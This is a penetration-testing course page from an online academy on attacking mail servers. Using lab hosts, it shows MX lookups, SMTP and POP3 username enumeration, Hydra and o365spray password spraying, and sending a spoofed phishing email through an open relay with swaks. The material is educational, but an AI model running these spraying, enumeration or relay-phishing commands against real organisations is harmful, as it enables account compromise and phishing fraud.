
<h1>Attacking Email Services</h1>
<hr/>
<p>A <code>mail server</code> (sometimes also referred to as an email server) is a server that handles and delivers email over a network, usually over the Internet. A mail server can receive emails from a client device and send them to other mail servers. A mail server can also deliver emails to a client device. A client is usually the device where we read our emails (computers, smartphones, etc.).</p>
<p>When we press the <code>Send</code> button in our email application (email client), the program establishes a connection to an <code>SMTP</code> server on the network or Internet. The name <code>SMTP</code> stands for Simple Mail Transfer Protocol, and it is a protocol for delivering emails from clients to servers and from servers to other servers.</p>
<p>When we download emails to our email application, it will connect to a <code>POP3</code> or <code>IMAP4</code> server on the Internet, which allows the user to save messages in a server mailbox and download them periodically.</p>
<p>By default, <code>POP3</code> clients remove downloaded messages from the email server. This behavior makes it difficult to access email on multiple devices since downloaded messages are stored on the local computer. However, we can typically configure a <code>POP3</code> client to keep copies of downloaded messages on the server.</p>
<p>On the other hand, by default, <code>IMAP4</code> clients do not remove downloaded messages from the email server. This behavior makes it easy to access email messages from multiple devices. Let's see how we can target mail servers.</p>
<p><img alt="text" src="https://academy.hackthebox.com/storage/modules/116/SMTP-IMAP-1.png"/></p>
<hr/>
<h2>Enumeration</h2>
<p>Email servers are complex and usually require us to enumerate multiple servers, ports, and services. Furthermore, today most companies have their email services in the cloud with services such as <a href="https://www.microsoft.com/en-ww/microsoft-365/outlook/email-and-calendar-software-microsoft-outlook">Microsoft 365</a> or <a href="https://workspace.google.com/solutions/new-business/">G-Suite</a>. Therefore, our approach to attacking the email service depends on the service in use.</p>
<p>We can use the <code>Mail eXchanger</code> (<code>MX</code>) DNS record to identify a mail server. The MX record specifies the mail server responsible for accepting email messages on behalf of a domain name. It is possible to configure several MX records, typically pointing to an array of mail servers for load balancing and redundancy.</p>
<p>We can use tools such as <code>host</code> or <code>dig</code> and online websites such as <a href="https://mxtoolbox.com/">MXToolbox</a> to query information about the MX records:</p>
<h4>Host - MX Records</h4>
<pre><code class="language-shell-session">[!bash!]$ host -t MX hackthebox.eu

hackthebox.eu mail is handled by 1 aspmx.l.google.com.
</code></pre>
<pre><code class="language-shell-session">[!bash!]$ host -t MX microsoft.com

microsoft.com mail is handled by 10 microsoft-com.mail.protection.outlook.com.
</code></pre>
<h4>DIG - MX Records</h4>
<pre><code class="language-shell-session">[!bash!]$ dig mx plaintext.do | grep "MX" | grep -v ";"

plaintext.do.           7076    IN      MX      50 mx3.zoho.com.
plaintext.do.           7076    IN      MX      10 mx.zoho.com.
plaintext.do.           7076    IN      MX      20 mx2.zoho.com.
</code></pre>
<pre><code class="language-shell-session">[!bash!]$ dig mx inlanefreight.com | grep "MX" | grep -v ";"

inlanefreight.com.      300     IN      MX      10 mail1.inlanefreight.com.
</code></pre>
<h4>Host - A Records</h4>
<pre><code class="language-shell-session">[!bash!]$ host -t A mail1.inlanefreight.htb.

mail1.inlanefreight.htb has address 10.129.14.128
</code></pre>
<p>These <code>MX</code> records indicate that the first three mail services are using a cloud services G-Suite (aspmx.l.google.com), Microsoft 365 (microsoft-com.mail.protection.outlook.com), and Zoho (mx.zoho.com), and the last one may be a custom mail server hosted by the company.</p>
<p>This information is essential because the enumeration methods may differ from one service to another. For example, most cloud service providers use their mail server implementation and adopt modern authentication, which opens new and unique attack vectors for each service provider. On the other hand, if the company configures the service, we could uncover bad practices and misconfigurations that allow common attacks on mail server protocols.</p>
<p>If we are targetting a custom mail server implementation such as <code>inlanefreight.htb</code>, we can enumerate the following ports:</p>
<table>
<thead>
<tr>
<th><strong>Port</strong></th>
<th><strong>Service</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>TCP/25</code></td>
<td>SMTP Unencrypted</td>
</tr>
<tr>
<td><code>TCP/143</code></td>
<td>IMAP4 Unencrypted</td>
</tr>
<tr>
<td><code>TCP/110</code></td>
<td>POP3 Unencrypted</td>
</tr>
<tr>
<td><code>TCP/465</code></td>
<td>SMTP Encrypted</td>
</tr>
<tr>
<td><code>TCP/587</code></td>
<td>SMTP Encrypted/<a href="https://en.wikipedia.org/wiki/Opportunistic_TLS">STARTTLS</a></td>
</tr>
<tr>
<td><code>TCP/993</code></td>
<td>IMAP4 Encrypted</td>
</tr>
<tr>
<td><code>TCP/995</code></td>
<td>POP3 Encrypted</td>
</tr>
</tbody>
</table>
<p>We can use <code>Nmap</code>'s default script <code>-sC</code> option to enumerate those ports on the target system:</p>
<pre><code class="language-shell-session">[!bash!]$ sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-27 17:56 CEST
Nmap scan report for 10.129.14.128
Host is up (0.00025s latency).

PORT   STATE SERVICE VERSION
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: mail1.inlanefreight.htb, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
MAC Address: 00:00:00:00:00:00 (VMware)
</code></pre>
<hr/>
<h2>Misconfigurations</h2>
<p>Email services use authentication to allow users to send emails and receive emails. A misconfiguration can happen when the SMTP service allows anonymous authentication or support protocols that can be used to enumerate valid usernames.</p>
<h4>Authentication</h4>
<p>The SMTP server has different commands that can be used to enumerate valid usernames <code>VRFY</code>, <code>EXPN</code>, and <code>RCPT TO</code>. If we successfully enumerate valid usernames, we can attempt to password spray, brute-forcing, or guess a valid password. So let's explore how those commands work.</p>
<p><code>VRFY</code> this command instructs the receiving SMTP server to check the validity of a particular email username. The server will respond, indicating if the user exists or not. This feature can be disabled.</p>
<h4>VRFY Command</h4>
<pre><code class="language-shell-session">[!bash!]$ telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)


VRFY root

252 2.0.0 root


VRFY www-data

252 2.0.0 www-data


VRFY new-user

550 5.1.1 &lt;new-user&gt;: Recipient address rejected: User unknown in local recipient table
</code></pre>
<p><code>EXPN</code> is similar to <code>VRFY</code>, except that when used with a distribution list, it will list all users on that list. This can be a bigger problem than the <code>VRFY</code> command since sites often have an alias such as "all."</p>
<h4>EXPN Command</h4>
<pre><code class="language-shell-session">[!bash!]$ telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)


EXPN john

250 2.1.0 <a class="__cf_email__" data-cfemail="6f050007012f0601030e010a091d0a0608071b41071b0d" href="/cdn-cgi/l/email-protection">[email protected]</a>


EXPN support-team

250 2.0.0 <a class="__cf_email__" data-cfemail="1f7c7e6d70735f7671737e717a796d7a7678776b31776b7d" href="/cdn-cgi/l/email-protection">[email protected]</a>
250 2.1.5 <a class="__cf_email__" data-cfemail="197c75706a785970777578777c7f6b7c707e716d37716d7b" href="/cdn-cgi/l/email-protection">[email protected]</a>
</code></pre>
<p><code>RCPT TO</code> identifies the recipient of the email message. This command can be repeated multiple times for a given message to deliver a single message to multiple recipients.</p>
<h4>RCPT TO Command</h4>
<pre><code class="language-shell-session">[!bash!]$ telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)


MAIL FROM:<a class="__cf_email__" data-cfemail="b6c2d3c5c2f6dec2d498d5d9db" href="/cdn-cgi/l/email-protection">[email protected]</a>
it is
250 2.1.0 <a class="__cf_email__" data-cfemail="6317061017230b17014d000c0e" href="/cdn-cgi/l/email-protection">[email protected]</a>... Sender ok


RCPT TO:julio

550 5.1.1 julio... User unknown


RCPT TO:kate

550 5.1.1 kate... User unknown


RCPT TO:john

250 2.1.5 john... Recipient ok
</code></pre>
<p>We can also use the <code>POP3</code> protocol to enumerate users depending on the service implementation. For example, we can use the command <code>USER</code> followed by the username, and if the server responds <code>OK</code>. This means that the user exists on the server.</p>
<h4>USER Command</h4>
<pre><code class="language-shell-session">[!bash!]$ telnet 10.10.110.20 110

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
+OK POP3 Server ready

USER julio

-ERR


USER john

+OK
</code></pre>
<p>To automate our enumeration process, we can use a tool named <a href="https://github.com/pentestmonkey/smtp-user-enum">smtp-user-enum</a>. We can specify the enumeration mode with the argument <code>-M</code> followed by <code>VRFY</code>, <code>EXPN</code>, or <code>RCPT</code>, and the argument <code>-U</code> with a file containing the list of users we want to enumerate. Depending on the server implementation and enumeration mode, we need to add the domain for the email address with the argument <code>-D</code>. Finally, we specify the target with the argument <code>-t</code>.</p>
<pre><code class="language-shell-session">[!bash!]$ smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7

Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... RCPT
Worker Processes ......... 5
Usernames file ........... userlist.txt
Target count ............. 1
Username count ........... 78
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ inlanefreight.htb

######## Scan started at Thu Apr 21 06:53:07 2022 #########
10.129.203.7: <a class="__cf_email__" data-cfemail="d6bcb9a5b396bfb8bab7b8b3b0a4b3bfb1bea2f8bea2b4" href="/cdn-cgi/l/email-protection">[email protected]</a> exists
10.129.203.7: <a class="__cf_email__" data-cfemail="473722233528072e292b2629222135222e202f33692f3325" href="/cdn-cgi/l/email-protection">[email protected]</a> exists
10.129.203.7: <a class="__cf_email__" data-cfemail="4c272d38290c2522202d22292a3e29252b24386224382e" href="/cdn-cgi/l/email-protection">[email protected]</a> exists
######## Scan completed at Thu Apr 21 06:53:18 2022 #########
3 results.

78 queries in 11 seconds (7.1 queries / sec)
</code></pre>
<hr/>
<h2>Cloud Enumeration</h2>
<p>As discussed, cloud service providers use their own implementation for email services. Those services commonly have custom features that we can abuse for operation, such as username enumeration. Let's use Office 365 as an example and explore how we can enumerate usernames in this cloud platform.</p>
<p><a href="https://github.com/0xZDH/o365spray">O365spray</a> is a username enumeration and password spraying tool aimed at Microsoft Office 365 (O365) developed by <a href="https://twitter.com/0xzdh">ZDH</a>. This tool reimplements a collection of enumeration and spray techniques researched and identified by those mentioned in <a href="https://github.com/0xZDH/o365spray#Acknowledgments">Acknowledgments</a>. Let's first validate if our target domain is using Office 365.</p>
<h4>O365 Spray</h4>
<pre><code class="language-shell-session">[!bash!]$ python3 o365spray.py --validate --domain msplaintext.xyz

            *** O365 Spray ***            

&gt;----------------------------------------&lt;

   &gt; version        :  2.0.4
   &gt; domain         :  msplaintext.xyz
   &gt; validate       :  True
   &gt; timeout        :  25 seconds
   &gt; start          :  2022-04-13 09:46:40

&gt;----------------------------------------&lt;

[2022-04-13 09:46:40,344] INFO : Running O365 validation for: msplaintext.xyz
[2022-04-13 09:46:40,743] INFO : [VALID] The following domain is using O365: msplaintext.xyz
</code></pre>
<p>Now, we can attempt to identify usernames.</p>
<pre><code class="language-shell-session">[!bash!]$ python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz        
                                       
            *** O365 Spray ***             

&gt;----------------------------------------&lt;

   &gt; version        :  2.0.4
   &gt; domain         :  msplaintext.xyz
   &gt; enum           :  True
   &gt; userfile       :  users.txt
   &gt; enum_module    :  office
   &gt; rate           :  10 threads
   &gt; timeout        :  25 seconds
   &gt; start          :  2022-04-13 09:48:03

&gt;----------------------------------------&lt;

[2022-04-13 09:48:03,621] INFO : Running O365 validation for: msplaintext.xyz
[2022-04-13 09:48:04,062] INFO : [VALID] The following domain is using O365: msplaintext.xyz
[2022-04-13 09:48:04,064] INFO : Running user enumeration against 67 potential users
[2022-04-13 09:48:08,244] INFO : [VALID] <a class="__cf_email__" data-cfemail="264a43514348664b55564a474f4852435e52085e5f5c" href="/cdn-cgi/l/email-protection">[email protected]</a>
[2022-04-13 09:48:10,415] INFO : [VALID] <a class="__cf_email__" data-cfemail="e58f909097808b84a588969589848c8b91809d91cb9d9c9f" href="/cdn-cgi/l/email-protection">[email protected]</a>
[2022-04-13 09:48:10,415] INFO : 

[ * ] Valid accounts can be found at: '/opt/o365spray/enum/enum_valid_accounts.2204130948.txt'
[ * ] All enumerated accounts can be found at: '/opt/o365spray/enum/enum_tested_accounts.2204130948.txt'

[2022-04-13 09:48:10,416] INFO : Valid Accounts: 2
</code></pre>
<hr/>
<h2>Password Attacks</h2>
<p>We can use <code>Hydra</code> to perform a password spray or brute force against email services such as <code>SMTP</code>, <code>POP3</code>, or <code>IMAP4</code>. First, we need to get a username list and a password list and specify which service we want to attack. Let us see an example for <code>POP3</code>.</p>
<h4>Hydra - Password Attack</h4>
<pre><code class="language-shell-session">[!bash!]$ hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3

Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-04-13 11:37:46
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 67 login tries (l:67/p:1), ~5 tries per task
[DATA] attacking pop3://10.10.110.20:110/
[110][pop3] host: 10.129.42.197   login: john   password: Company01!
1 of 1 target successfully completed, 1 valid password found
</code></pre>
<p>If cloud services support SMTP, POP3, or IMAP4 protocols, we may be able to attempt to perform password spray using tools like <code>Hydra</code>, but these tools are usually blocked. We can instead try to use custom tools such as <a href="https://github.com/0xZDH/o365spray">o365spray</a> or <a href="https://github.com/dafthack/MailSniper">MailSniper</a> for Microsoft Office 365 or <a href="https://github.com/ustayready/CredKing">CredKing</a> for Gmail or Okta. Keep in mind that these tools need to be up-to-date because if the service provider changes something (which happens often), the tools may not work anymore. This is a perfect example of why we must understand what our tools are doing and have the know-how to modify them if they do not work properly for some reason.</p>
<h4>O365 Spray - Password Spraying</h4>
<pre><code class="language-shell-session">[!bash!]$ python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz

            *** O365 Spray ***            

&gt;----------------------------------------&lt;

   &gt; version        :  2.0.4
   &gt; domain         :  msplaintext.xyz
   &gt; spray          :  True
   &gt; password       :  March2022!
   &gt; userfile       :  usersfound.txt
   &gt; count          :  1 passwords/spray
   &gt; lockout        :  1.0 minutes
   &gt; spray_module   :  oauth2
   &gt; rate           :  10 threads
   &gt; safe           :  10 locked accounts
   &gt; timeout        :  25 seconds
   &gt; start          :  2022-04-14 12:26:31

&gt;----------------------------------------&lt;

[2022-04-14 12:26:31,757] INFO : Running O365 validation for: msplaintext.xyz
[2022-04-14 12:26:32,201] INFO : [VALID] The following domain is using O365: msplaintext.xyz
[2022-04-14 12:26:32,202] INFO : Running password spray against 2 users.
[2022-04-14 12:26:32,202] INFO : Password spraying the following passwords: ['March2022!']
[2022-04-14 12:26:33,025] INFO : [VALID] <a class="__cf_email__" data-cfemail="cba7aebcaea58ba6b8bba7aaa2a5bfaeb3bfe5b3b2b1" href="/cdn-cgi/l/email-protection">[email protected]</a>:March2022!
[2022-04-14 12:26:33,048] INFO : 

[ * ] Writing valid credentials to: '/opt/o365spray/spray/spray_valid_credentials.2204141226.txt'
[ * ] All sprayed credentials can be found at: '/opt/o365spray/spray/spray_tested_credentials.2204141226.txt'

[2022-04-14 12:26:33,048] INFO : Valid Credentials: 1
</code></pre>
<hr/>
<h2>Protocol Specifics Attacks</h2>
<p>An open relay is a Simple Mail Transfer Protocol (<code>SMTP</code>) server, which is improperly configured and allows an unauthenticated email relay. Messaging servers that are accidentally or intentionally configured as open relays allow mail from any source to be transparently re-routed through the open relay server. This behavior masks the source of the messages and makes it look like the mail originated from the open relay server.</p>
<h4>Open Relay</h4>
<p>From an attacker's standpoint, we can abuse this for phishing by sending emails as non-existing users or spoofing someone else's email. For example, imagine we are targeting an enterprise with an open relay mail server, and we identify they use a specific email address to send notifications to their employees. We can send a similar email using the same address and add our phishing link with this information. With the <code>nmap smtp-open-relay</code> script, we can identify if an SMTP port allows an open relay.</p>
<pre><code class="language-shell-session">[!bash!]# nmap -p25 -Pn --script smtp-open-relay 10.10.11.213

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-28 23:59 EDT
Nmap scan report for 10.10.11.213
Host is up (0.28s latency).

PORT   STATE SERVICE
25/tcp open  smtp
|_smtp-open-relay: Server is an open relay (14/16 tests)
</code></pre>
<p>Next, we can use any mail client to connect to the mail server and send our email.</p>
<pre><code class="language-shell-session">[!bash!]# swaks --from <a class="__cf_email__" data-cfemail="fc929388959a959f9d889593928fbc9592909d92999a8e99959b9488d29f9391" href="/cdn-cgi/l/email-protection">[email protected]</a> --to <a class="__cf_email__" data-cfemail="badfd7cad6d5c3dfdfc9fad3d4d6dbd4dfdcc8dfd3ddd2ce94d9d5d7" href="/cdn-cgi/l/email-protection">[email protected]</a> --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213

=== Trying 10.10.11.213:25...
=== Connected to 10.10.11.213.
&lt;-  220 mail.localdomain SMTP Mailer ready
 -&gt; EHLO parrot
&lt;-  250-mail.localdomain
&lt;-  250-SIZE 33554432
&lt;-  250-8BITMIME
&lt;-  250-STARTTLS
&lt;-  250-AUTH LOGIN PLAIN CRAM-MD5 CRAM-SHA1
&lt;-  250 HELP
 -&gt; MAIL FROM:&lt;<a class="__cf_email__" data-cfemail="8ae4e5fee3ece3e9ebfee3e5e4f9cae3e4e6ebe4efecf8efe3ede2fea4e9e5e7" href="/cdn-cgi/l/email-protection">[email protected]</a>&gt;
&lt;-  250 OK
 -&gt; RCPT TO:&lt;<a class="__cf_email__" data-cfemail="6c09011c00031509091f2c0502000d02090a1e09050b0418420f0301" href="/cdn-cgi/l/email-protection">[email protected]</a>&gt;
&lt;-  250 OK
 -&gt; DATA
&lt;-  354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;
 -&gt; Date: Thu, 29 Oct 2020 01:36:06 -0400
 -&gt; To: <a class="__cf_email__" data-cfemail="8feae2ffe3e0f6eaeafccfe6e1e3eee1eae9fdeae6e8e7fba1ece0e2" href="/cdn-cgi/l/email-protection">[email protected]</a>
 -&gt; From: <a class="__cf_email__" data-cfemail="81efeef5e8e7e8e2e0f5e8eeeff2c1e8efede0efe4e7f3e4e8e6e9f5afe2eeec" href="/cdn-cgi/l/email-protection">[email protected]</a>
 -&gt; Subject: Company Notification
 -&gt; Message-Id: &lt;20201029013606.775675@parrot&gt;
 -&gt; X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/
 -&gt; 
 -&gt; Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/
 -&gt; 
 -&gt; 
 -&gt; .
&lt;-  250 OK
 -&gt; QUIT
&lt;-  221 Bye
=== Connection closed with remote host.
</code></pre>
<div class="my-3 p-3 vpn-switch-card" id="vpn-switch">
<p class="font-size-14 color-white mb-0">VPN Servers</p>
<p class="font-size-13 mb-0">
<i class="fas fa-exclamation-triangle text-warning"></i><span class="color-white ml-1">Warning:</span> Each
                    time you "Switch",
                    your connection keys are regenerated and you must re-download your VPN connection file.
                </p>
<p class="font-size-13 mb-0">
                    All VM instances associated with the old VPN Server will be terminated when switching to
                    a new VPN server. <br/>
                    Existing PwnBox instances will automatically switch to the new VPN server.</p>
<div class="row mb-3">
<div class="col-12 mt-2">
<div class="d-none justify-content-center vpn-loader">
<div class="spinner-border text-success" role="status">
<span class="sr-only">Switching VPN...</span>
</div>
</div>
<select aria-label="vpn server" class="selectpicker custom-form-control vpnSelector badge-select" title="Select VPN Server">
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 6 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt; &lt;span class='recommended'&gt; &lt;img src='/images/sparkles-solid.svg'/&gt;Recommended&lt;/span&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="30" value="17">US Academy 6</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 5 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="31" value="16">US Academy 5</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 4 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="32" value="13">US Academy 4</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 1 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="33" value="4">US Academy 1</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 2 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="33" value="5">US Academy 2</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 5 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt; &lt;span class='recommended'&gt; &lt;img src='/images/sparkles-solid.svg'/&gt;Recommended&lt;/span&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="36" value="12">EU Academy 5</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 3 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="37" value="9">US Academy 3</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 2 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="39" selected="" value="2">EU Academy 2</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 1 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="40" value="1">EU Academy 1</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 3 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="41" value="14">EU Academy 3</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 4 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="43" value="11">EU Academy 4</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 6 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="47" value="15">EU Academy 6</option>
</select>
<p class="font-size-14 color-white mb-0 mt-2">PROTOCOL</p>
<div class="d-flex">
<div class="custom-control custom-radio custom-control-inline">
<input checked="" class="custom-control-input" id="rd_1" name="vpn-protocol" type="radio" value="udp"/>
<label class="custom-control-label green font-size-14" for="rd_1">UDP
                                    1337</label>
</div>
<div class="custom-control custom-radio">
<input class="custom-control-input" id="rd_2" name="vpn-protocol" type="radio" value="tcp"/>
<label class="custom-control-label green font-size-14" for="rd_2">TCP
                                    443</label>
</div>
</div>
<div class="d-flex justify-content-center">
<button class="btn btn-outline-success btn-lg download-vpn-settings mt-3 px-5 font-size-12">
                                DOWNLOAD VPN CONNECTION FILE
                            </button>
</div>
</div>
</div>
</div>
<div class="mb-5 pwnbox-select-card"></div>
<div id="screen" style="height: 600px; border: 1px solid;">
<div class="screenPlaceholder">
<div class="instanceLoading" style="display: none;">
<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i>
</h1>
<div class="text-center">Instance is starting...</div>
</div>
<div class="instanceTerminating" style="display: none;">
<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i>
</h1>
<div class="text-center">Terminating instance...</div>
</div>
<div class="row instanceStart max-width-canvas">
<div class="col-4"></div>
<div class="col-4">
<button class="startInstanceBtn btn btn-success text-light btn-lg btn-block" style="margin-top: 270px;">Start Instance
                            </button>
<p class="text-center mt-2 font-size-13 font-secondary">
<span class="text-success spawnsLeft">
<i class="fal fa-infinity"></i>
</span> / 1 spawns left
                            </p>
</div>
<div class="col-4"></div>
</div>
</div>
</div>
<div class="row align-center justify-center my-4">
<div class="col-5 justify-start">
<button class="instance-button fullScreenBtn btn btn-light btn-sm float-left" style="display:none;" target="_blank"><i class="fad fa-expand text-success mr-1"></i>  Full Screen
                    </button>
<button class="instance-button terminateInstanceBtn btn btn-light btn-sm ml-2" style="display:none;"><i class="fad fa-times text-danger"></i>  Terminate
                    </button>
<button class="instance-button resetInstanceBtn btn btn-light btn-sm ml-1" style="display:none;"><i class="fad fa-sync text-warning mr-2"></i>  Reset
                    </button>
<div class="btn-group" role="group">
<button class="instance-button extendInstanceBtn btn btn-light btn-sm ml-1" style="display:none;cursor: default;">Life Left:
                            <span class="lifeLeft"></span>m
                        </button>
<button class="extendInstanceBtn extendInstanceBtnClicker btn btn-light btn-sm" data-title="Extend Life" data-toggle="tooltip" style="display:none;"><i class="fa fa-plus text-success"></i></button>
</div>
</div>
<div class="col-7 justify-end pt-2 pr-2 font-size-small text-right" id="statusText">Waiting to
                    start...
                </div>
</div>
<div class="d-inline-block mb-2 solutionSettings solutionSettingsOffsets" id="solutionsModuleSetting">
<div class="border border-secondary p-2 rounded">
<div class="custom-control custom-switch d-flex">
<input class="custom-control-input" disabled="" id="showSolutionsModuleSetting" type="checkbox"/>
<label class="custom-control-label font-size-14 font-weight-normal text-white" for="showSolutionsModuleSetting">
                                Enable step-by-step solutions for all questions
                            </label>
<span aria-hidden="true" class="cursor-pointer font-size-14 ml-1 mr-1 text-white" data-content="Access to this feature is exclusive to annual subscribers. To acquire an annual subscription, kindly proceed by clicking &lt;a href='/billing'&gt;here&lt;/a&gt;." data-html="true" data-placement="top" data-toggle="popover" data-trigger="click" title="Activate Solutions">
<i class="fa fa-info-circle font-size-12"></i>
</span>
<img alt="sparkles-icon-decoration" class="ml-2 w-auto sparkles-icon" height="20" src="/images/sparkles-solid.svg">
</img></div>
</div>
</div>
<div class="card" id="questionsDiv">
<div class="card-body">
<div class="row">
<div class="col-9">
<h4 class="card-title mt-0 font-size-medium">Questions</h4>
<p class="card-title-desc font-size-large font-size-15">Answer the question(s) below
                                to complete this Section and earn cubes!</p>
<span class="spawnTargetBtn spawn-target-text-clone d-none">Click here to spawn the target
                                system!</span>
<p class="card-title-desc font-size-large font-size-15 mb-0">
    Target(s): <span class="text-success">
<span class="target" style="cursor:pointer;">
<i class="fad fa-circle-notch fa-spin"></i>
<span class="spawnTargetBtn">Fetching status...</span>
</span>
</span>
<button class="resetTargetBtn btn btn-light btn-sm" data-title="Reset Target(s)" data-toggle="tooltip" style="cursor: pointer; display: none;">
<i class="fad fa-sync text-warning"></i>
</button>
<br/>
<div class="d-flex align-items-center targetLifeContainer">
<span class="targetLifeTimeContainer" style="display: none;">
            Life Left: <span class="targetLifeTime font-size-15">0</span> minute(s)
                            <button class="extendTargetSystemBtn btn btn-light btn-sm module-button" data-title="Extend Life by 1 hour (up to 6 hours total lifespan)" data-toggle="tooltip">
<i class="fa fa-plus text-success extend-icon"></i>
<div class="extend-loader spinner-border spinner-border-small text-success d-none" role="status">
</div>
</button>
<button class="text-danger btn btn-light btn-sm module-button font-size-16 mb-1" data-target="#terminateVmModal" data-toggle="modal">
                    Terminate <span class="fa-regular fa-x text-danger font-size-13 ml-2"></span>
</button>
</span>
</div>
</p>
</div>
<div class="col-3 text-right float-right">
<button class="btn btn-light bg-color-blue-nav mt-2 w-100 d-flex align-items-center" data-target="#cheatSheetModal" data-toggle="modal">
<div><i class="fad fa-file-alt mr-2"></i></div>
<div class="text-center w-100 ml-1">Cheat Sheet</div>
</button>
<a class="btn btn-light bg-color-blue-nav mt-2 d-flex align-items-center" data-title='Key is already installed in "My Workstation"' data-toggle="tooltip" href="https://academy.hackthebox.com/vpn/key">
<div><i class="fad fa-chart-network mr-2"></i></div>
<div class="text-center w-100">Download VPN Connection File</div>
</a>
</div>
</div>
<div>
<div>
